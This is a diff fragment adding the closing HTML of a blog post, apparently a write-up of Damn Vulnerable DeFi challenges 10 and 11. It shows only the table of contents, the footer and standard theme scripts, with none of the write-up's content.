+              <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Damn-Defi靶场刷题记录-10-11"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">Damn Defi靶场刷题记录(10-11)</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#10-Free-rider"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">10 Free rider</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Code-Review"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">Code Review</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#11-Backdoor"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">11 Backdoor</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#Code-Review-1"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">Code Review</span></a></li></ol></li></ol></li></ol>
+            
+          
+          </div>
+        </aside>
+      
+    
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/ThomasXu-blockchain">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Thomas_Xu 2022 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe name="star" style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://dusign.net/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
